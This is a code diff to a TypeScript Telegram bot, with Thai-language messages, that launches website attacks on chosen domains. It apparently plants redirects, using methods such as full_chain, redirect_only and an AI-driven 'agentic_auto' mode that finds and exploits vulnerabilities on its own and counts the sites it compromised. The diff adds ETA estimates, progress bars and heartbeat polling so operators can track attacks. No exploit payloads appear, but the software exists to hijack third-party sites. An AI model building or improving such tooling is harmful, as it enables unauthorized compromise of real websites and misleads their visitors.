@@ -1342,6 +1342,7 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
       case "attack_website": {
         const method = args.method || "full_chain";
         const targetDomain = args.targetDomain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+        const methodEta = getMethodEta(method);
         let result = "";
         
         if (method === "scan_only") {
@@ -1417,7 +1418,9 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
             `เป้าหมาย: ${targetDomain}\n` +
             `Redirect: ${redirectUrl}\n` +
             `Mode: AI Auto — จะหาช่องโหว่และโจมตีอัตโนมัติ\n` +
+            `⏱ ETA: ${methodEta.label}\n` +
             `สถานะ: 🔄 กำลังดำเนินการ (ทำงาน background)\n` +
+            `📡 ระบบจะ update สถานะทุก 30 วินาที และแจ้งเมื่อเสร็จ\n` +
             `⏱ เริ่มต้นใช้เวลา ${formatDuration(duration)}`;
           await saveAttackLog({
             targetDomain, method: "agentic_auto", success: true,
@@ -2449,8 +2452,11 @@ export async function handleTelegramWebhook(update: TelegramUpdate): Promise<voi
           const elapsed = formatElapsed(Date.now() - atk.startedAt);
           const remainMs = ATTACK_TIMEOUT_MS - (Date.now() - atk.startedAt);
           const timeoutIn = remainMs > 0 ? formatElapsed(remainMs) : "EXPIRED";
+          const atkEta = getMethodEta(atk.method);
+          const etaRemaining = formatEtaRemaining(atk.startedAt, atkEta);
           lines.push(`  \u2022 ${atk.domain} [${atk.method}]`);
-          lines.push(`    \u23f1 ${elapsed} | Timeout in: ${timeoutIn}`);
+          lines.push(`    \u23f1 ${elapsed} | ETA remaining: ${etaRemaining}`);
+          lines.push(`    \u23f0 Timeout in: ${timeoutIn}`);
           lines.push(`    Status: ${atk.lastUpdate}`);
         }
       } else {
@@ -2999,6 +3005,8 @@ async function sendAttackConfirmKeyboard(config: TelegramConfig, chatId: number,
     agentic_auto: "\uD83E\uDD16 AI Auto Attack",
   };
   
+  const eta = getMethodEta(method);
+  
   const keyboard = [
     [
       { text: "\u2705 ยืนยัน — เริ่มโจมตี", callback_data: `atk_confirm:${domain}:${method}` },
@@ -3015,7 +3023,7 @@ async function sendAttackConfirmKeyboard(config: TelegramConfig, chatId: number,
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       chat_id: chatId,
-      text: `\u26A0\uFE0F ยืนยันการโจมตี\n\nTarget: ${domain}\nMethod: ${methodLabels[method] || method}\n\nกด \u2705 เพื่อเริ่ม`,
+      text: `\u26A0\uFE0F ยืนยันการโจมตี\n\nTarget: ${domain}\nMethod: ${methodLabels[method] || method}\n\u23F1 ETA: ${eta.label}\n\nกด \u2705 เพื่อเริ่ม`,
       reply_markup: { inline_keyboard: keyboard },
     }),
     signal: AbortSignal.timeout(10000),
@@ -3305,12 +3313,60 @@ const PROGRESS_PHASES = [
   { emoji: "\uD83D\uDCCA", name: "Generating report" },
 ];
 
-function buildProgressText(domain: string, method: string, currentStep: number, totalSteps: number, stepTimings: Array<{ step: string; ms: number; ok: boolean }>, status: "running" | "done" | "failed"): string {
-  const bar = Array.from({ length: totalSteps }, (_, i) => i < currentStep ? "\u2588" : "\u2591").join("");
+// ═══════════════════════════════════════════════════════
+//  ETA ESTIMATION — estimated time per attack method
+// ═══════════════════════════════════════════════════════
+
+const METHOD_ETA_MS: Record<string, { min: number; max: number; label: string }> = {
+  scan_only:           { min: 30_000,  max: 120_000,  label: "~30s - 2 min" },
+  redirect_only:       { min: 60_000,  max: 300_000,  label: "~1 - 5 min" },
+  full_chain:          { min: 120_000, max: 480_000,  label: "~2 - 8 min" },
+  agentic_auto:        { min: 120_000, max: 600_000,  label: "~2 - 10 min" },
+  advanced_all:        { min: 60_000,  max: 420_000,  label: "~1 - 7 min" },
+  deploy_advanced_all: { min: 120_000, max: 480_000,  label: "~2 - 8 min" },
+};
+
+function getMethodEta(method: string): { min: number; max: number; label: string } {
+  if (METHOD_ETA_MS[method]) return METHOD_ETA_MS[method];
+  if (method.startsWith("deploy_advanced_")) return METHOD_ETA_MS.deploy_advanced_all;
+  if (method.startsWith("advanced_")) return METHOD_ETA_MS.advanced_all;
+  return { min: 60_000, max: 300_000, label: "~1 - 5 min" };
+}
+
+function formatEtaRemaining(startedAt: number, eta: { min: number; max: number }): string {
+  const elapsed = Date.now() - startedAt;
+  // Use midpoint of min/max as estimated total
+  const estimatedTotal = (eta.min + eta.max) / 2;
+  const remaining = Math.max(0, estimatedTotal - elapsed);
+  if (remaining <= 0) return "เกือบเสร็จแล้ว...";
+  return `~${formatDuration(remaining)}`;
+}
+
+function buildAnimatedSpinner(elapsed: number): string {
+  const frames = ["\u25D0", "\u25D3", "\u25D1", "\u25D2"];
+  const idx = Math.floor(elapsed / 500) % frames.length;
+  return frames[idx];
+}
+
+function buildProgressText(domain: string, method: string, currentStep: number, totalSteps: number, stepTimings: Array<{ step: string; ms: number; ok: boolean }>, status: "running" | "done" | "failed", startedAt?: number): string {
+  const barLen = Math.max(totalSteps, 10);
+  const filledLen = Math.round((currentStep / totalSteps) * barLen);
+  const bar = "\u2588".repeat(filledLen) + "\u2591".repeat(barLen - filledLen);
   const pct = Math.round((currentStep / totalSteps) * 100);
   
-  let text = `\u2694\uFE0F Attack: ${domain}\nMethod: ${method}\n\n`;
-  text += `Progress: [${bar}] ${pct}%\n\n`;
+  const eta = getMethodEta(method);
+  const elapsed = startedAt ? Date.now() - startedAt : stepTimings.reduce((sum, t) => sum + t.ms, 0);
+  
+  let text = `\u2694\uFE0F Attack: ${domain}\nMethod: ${method}\n`;
+  text += `ETA: ${eta.label}\n\n`;
+  text += `[${bar}] ${pct}%\n`;
+  text += `\u23F1 Elapsed: ${formatDuration(elapsed)}`;
+  
+  if (status === "running" && startedAt) {
+    const remaining = formatEtaRemaining(startedAt, eta);
+    text += ` | Remaining: ${remaining}`;
+  }
+  text += `\n\n`;
   
   for (const t of stepTimings) {
     const icon = t.ok ? "\u2705" : "\u274C";
@@ -3319,13 +3375,15 @@ function buildProgressText(domain: string, method: string, currentStep: number, 
   
   if (status === "running" && currentStep < totalSteps) {
     const phase = PROGRESS_PHASES[Math.min(currentStep, PROGRESS_PHASES.length - 1)];
-    text += `\n\u23F3 ${phase.emoji} ${phase.name}...`;
+    const spinner = buildAnimatedSpinner(elapsed);
+    text += `\n${spinner} ${phase.emoji} ${phase.name}...`;
   } else if (status === "done") {
-    const totalMs = stepTimings.reduce((sum, t) => sum + t.ms, 0);
+    const totalMs = startedAt ? Date.now() - startedAt : stepTimings.reduce((sum, t) => sum + t.ms, 0);
     const successCount = stepTimings.filter(t => t.ok).length;
     text += `\n\u2705 เสร็จสิ้น! ${successCount}/${totalSteps} steps สำเร็จ (${formatDuration(totalMs)})`;
   } else if (status === "failed") {
-    text += `\n\u274C โจมตีล้มเหลว`;
+    const totalMs = startedAt ? Date.now() - startedAt : stepTimings.reduce((sum, t) => sum + t.ms, 0);
+    text += `\n\u274C โจมตีล้มเหลว (${formatDuration(totalMs)})`;
   }
   
   return text;
@@ -3333,8 +3391,9 @@ function buildProgressText(domain: string, method: string, currentStep: number, 
 
 async function executeAttackWithProgress(config: TelegramConfig, chatId: number, domain: string, method: string): Promise<void> {
   console.log(`[TelegramAI] executeAttackWithProgress called: domain=${domain}, method=${method}`);
+  const eta = getMethodEta(method);
   const progressMsgId = await sendAndGetMessageId(config, chatId,
-    `\u2694\uFE0F เริ่มโจมตี ${domain}...\nMethod: ${method}\n\n\u23F3 กำลังเตรียมพร้อม...`);
+    `\u2694\uFE0F เริ่มโจมตี ${domain}...\nMethod: ${method}\nETA: ${eta.label}\n\n\u23F3 กำลังเตรียมพร้อม...`);
   
   if (!progressMsgId) {
     await sendTelegramReply(config, chatId, "\u274C ส่งข้อความ progress ไม่ได้");
@@ -3385,9 +3444,11 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
   const timings: Array<{ step: string; ms: number; ok: boolean }> = [];
   let stepIndex = 0;
   
+  const totalStepsForMethod = method === "full_chain" ? 7 : method === "agentic_auto" ? 5 : 3;
+  
   const updateProgress = async (stepName: string, status: "running" | "done" | "failed") => {
     attackEntry.lastUpdate = stepName;
-    const text = buildProgressText(domain, method, stepIndex, method === "full_chain" ? 7 : 3, timings, status);
+    const text = buildProgressText(domain, method, stepIndex, totalStepsForMethod, timings, status, attackStartTime);
     await editTelegramMessage(config, chatId, progressMsgId, text);
   };
   
@@ -3604,10 +3665,10 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       }
       
     } else if (method === "agentic_auto") {
-      // AI auto — starts background session
+      // AI auto — starts background session WITH heartbeat polling
       await updateProgress("Starting AI auto attack", "running");
       const s1 = Date.now();
-      const { startAgenticSession, pickRedirectUrl } = await import("./agentic-attack-engine");
+      const { startAgenticSession, pickRedirectUrl, getAgenticSessionStatus } = await import("./agentic-attack-engine");
       const redirectUrl = await pickRedirectUrl();
       timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
       stepIndex++;
@@ -3625,30 +3686,158 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       timings.push({ step: `Session #${session.sessionId} started`, ms: Date.now() - s2, ok: true });
       stepIndex++;
       
-      timings.push({ step: "Running in background", ms: 0, ok: true });
-      stepIndex++;
-      await updateProgress("Done", "done");
+      // Heartbeat polling — monitor session every 30s until completion or timeout
+      const HEARTBEAT_INTERVAL_MS = 30_000;
+      const MAX_HEARTBEAT_DURATION_MS = ATTACK_TIMEOUT_MS - 30_000; // Stop 30s before timeout
+      const heartbeatStart = Date.now();
+      let lastPhase = "initializing";
+      let lastEventCount = 0;
+      let sessionCompleted = false;
       
-      // Save attack log
-      const agenticDuration = Date.now() - s1;
-      await saveAttackLog({
-        targetDomain: domain,
-        method: "agentic_auto",
-        success: true,
-        durationMs: agenticDuration,
-        redirectUrl,
-        sessionId: String(session.sessionId),
-        aiReasoning: `Agentic session #${session.sessionId} started in background`,
-      });
+      while (Date.now() - heartbeatStart < MAX_HEARTBEAT_DURATION_MS) {
+        // Check if aborted
+        if (attackEntry.abortController.signal.aborted) break;
+        
+        // Wait 30 seconds
+        await new Promise(resolve => setTimeout(resolve, HEARTBEAT_INTERVAL_MS));
+        if (attackEntry.abortController.signal.aborted) break;
+        
+        // Poll session status
+        try {
+          const status = await getAgenticSessionStatus(session.sessionId);
+          if (!status) break;
+          
+          const elapsed = Date.now() - attackStartTime;
+          const isRunning = status.isRunning;
+          const phase = status.currentPhase || "unknown";
+          const events = status.events || [];
+          const latestEvent = events.length > 0 ? events[events.length - 1] : null;
+          const progress = latestEvent?.progress || 0;
+          
+          // Build heartbeat update message
+          const heartbeatBar = "\u2588".repeat(Math.round(progress / 10)) + "\u2591".repeat(10 - Math.round(progress / 10));
+          let heartbeatText = `\u2694\uFE0F AI Auto Attack: ${domain}\n`;
+          heartbeatText += `Session #${session.sessionId} | ETA: ${eta.label}\n\n`;
+          heartbeatText += `[${heartbeatBar}] ${progress}%\n`;
+          heartbeatText += `\u23F1 Elapsed: ${formatDuration(elapsed)}`;
+          if (isRunning) {
+            heartbeatText += ` | Remaining: ${formatEtaRemaining(attackStartTime, eta)}`;
+          }
+          heartbeatText += `\n\n`;
+          
+          // Show phase info
+          heartbeatText += `\uD83D\uDD04 Phase: ${phase}\n`;
+          if (latestEvent) {
+            heartbeatText += `\uD83D\uDCDD ${latestEvent.detail.substring(0, 100)}\n`;
+          }
+          
+          // Show stats if available
+          if (status.targetsDiscovered || status.targetsAttacked) {
+            heartbeatText += `\n\uD83C\uDFAF Targets: ${status.targetsAttacked || 0}/${status.targetsDiscovered || 0} attacked`;
+            if (status.targetsSucceeded) heartbeatText += ` | \u2705 ${status.targetsSucceeded} success`;
+            if (status.targetsFailed) heartbeatText += ` | \u274C ${status.targetsFailed} failed`;
+            heartbeatText += `\n`;
+          }
+          
+          // Show new events since last check
+          const newEvents = events.slice(lastEventCount);
+          if (newEvents.length > 0) {
+            const recentEvents = newEvents.slice(-3);
+            heartbeatText += `\n\uD83D\uDCE1 Recent activity:\n`;
+            for (const ev of recentEvents) {
+              heartbeatText += `  \u2022 ${ev.detail.substring(0, 80)}\n`;
+            }
+          }
+          
+          lastEventCount = events.length;
+          lastPhase = phase;
+          attackEntry.lastUpdate = `${phase} (${progress}%)`;
+          
+          // Update progress message
+          await editTelegramMessage(config, chatId, progressMsgId, heartbeatText);
+          
+          // Check if session is done
+          if (!isRunning || status.status === "completed" || status.status === "error" || status.status === "stopped") {
+            sessionCompleted = true;
+            
+            // Update timings for final summary
+            timings.push({
+              step: `${status.targetsDiscovered || 0} targets discovered`,
+              ms: Date.now() - s2,
+              ok: (status.targetsDiscovered || 0) > 0,
+            });
+            stepIndex++;
+            timings.push({
+              step: `${status.targetsSucceeded || 0}/${status.targetsAttacked || 0} attacks succeeded`,
+              ms: 0,
+              ok: (status.targetsSucceeded || 0) > 0,
+            });
+            stepIndex++;
+            timings.push({
+              step: `Session ${status.status}`,
+              ms: 0,
+              ok: status.status === "completed" && (status.targetsSucceeded || 0) > 0,
+            });
+            stepIndex++;
+            
+            const success = (status.targetsSucceeded || 0) > 0;
+            await updateProgress("Done", success ? "done" : "failed");
+            
+            // Save attack log
+            const agenticDuration = Date.now() - s1;
+            await saveAttackLog({
+              targetDomain: domain,
+              method: "agentic_auto",
+              success,
+              durationMs: agenticDuration,
+              redirectUrl,
+              sessionId: String(session.sessionId),
+              aiReasoning: `Agentic session #${session.sessionId}: ${status.targetsAttacked || 0} attacked, ${status.targetsSucceeded || 0} succeeded, ${status.targetsFailed || 0} failed`,
+            });
+            
+            // Send NEW completion notification
+            await sendTelegramReply(config, chatId,
+              `\uD83D\uDD14 AI Auto Attack \u0e40\u0e2a\u0e23\u0e47\u0e08\u0e41\u0e25\u0e49\u0e27!\n\n` +
+              `${success ? "\u2705" : "\u274C"} ${domain}\n` +
+              `\uD83C\uDFAF Session #${session.sessionId}\n` +
+              `\uD83D\uDCCA Targets: ${status.targetsAttacked || 0} attacked | ${status.targetsSucceeded || 0} success | ${status.targetsFailed || 0} failed\n` +
+              `\uD83D\uDD17 Redirect: ${redirectUrl.substring(0, 50)}\n` +
+              `\u23F1 Total: ${formatDuration(agenticDuration)}`
+            );
+            
+            break;
+          }
+        } catch (e: any) {
+          console.warn(`[TelegramAI] Heartbeat poll error for session ${session.sessionId}: ${e.message}`);
+          // Continue polling even on error
+        }
+      }
       
-      // Send NEW completion notification
-      await sendTelegramReply(config, chatId,
-        `🔔 AI Auto Attack เริ่มทำงานแล้ว!\n\n` +
-        `🤖 ${domain}\n` +
-        `🔗 Redirect: ${redirectUrl.substring(0, 50)}\n` +
-        `🎯 Session #${session.sessionId} กำลังทำงานใน background\n` +
-        `⏱ Setup: ${formatDuration(agenticDuration)}`
-      );
+      // If session didn't complete within heartbeat window, send a "still running" notification
+      if (!sessionCompleted && !attackEntry.abortController.signal.aborted) {
+        const agenticDuration = Date.now() - s1;
+        timings.push({ step: "Session still running in background", ms: agenticDuration, ok: true });
+        stepIndex++;
+        await updateProgress("Running in background", "running");
+        
+        await saveAttackLog({
+          targetDomain: domain,
+          method: "agentic_auto",
+          success: true,
+          durationMs: agenticDuration,
+          redirectUrl,
+          sessionId: String(session.sessionId),
+          aiReasoning: `Agentic session #${session.sessionId} still running after ${formatDuration(agenticDuration)}`,
+        });
+        
+        await sendTelegramReply(config, chatId,
+          `\uD83D\uDD14 AI Auto Attack \u0e22\u0e31\u0e07\u0e17\u0e33\u0e07\u0e32\u0e19\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19 background\n\n` +
+          `\uD83E\uDD16 ${domain}\n` +
+          `\uD83C\uDFAF Session #${session.sessionId}\n` +
+          `\u23F1 Running: ${formatDuration(agenticDuration)}\n` +
+          `\uD83D\uDCA1 \u0e43\u0e0a\u0e49 /status \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e0a\u0e47\u0e04\u0e2a\u0e16\u0e32\u0e19\u0e30\u0e44\u0e14\u0e49\u0e15\u0e25\u0e2d\u0e14\u0e40\u0e27\u0e25\u0e32`
+        );
+      }
       
     } else if (method === "advanced_all" || method === "deploy_advanced_all" || method.startsWith("advanced_") || method.startsWith("deploy_advanced_")) {
       // Advanced attack — generate payloads + deploy
